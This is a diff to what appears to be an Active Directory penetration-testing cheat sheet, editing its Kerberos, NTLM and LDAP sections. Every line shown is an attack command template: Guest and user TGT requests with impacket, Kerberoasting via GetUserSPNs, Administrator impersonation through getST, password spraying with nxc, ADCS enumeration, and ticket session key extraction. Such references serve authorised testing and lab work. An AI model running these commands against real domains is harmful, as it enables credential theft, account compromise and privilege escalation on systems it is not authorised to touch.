@@ -428,12 +428,16 @@ certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA
 
 [*] (88) Kerberos
 +---------- .Ccache ----------+
+
++---------- .Ccache ----------+
+export KRB5CCNAME="$PWD/Guest.ccache"; chmod 0600 "$KRB5CCNAME"
+impacket-describeTicket Guest.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
+
 export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
 impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
 
 +---------- Kerberos Negotiation ----------+
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
+impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
@@ -446,8 +450,7 @@ while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetU
 impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" '$DOM'/'$USERNAME' -k -no-pass 2>/dev/null
 
 +---------- NTLM Negotiation ----------+
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs
+impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
@@ -509,8 +512,10 @@ snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
-
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -M adcs
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords -k -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
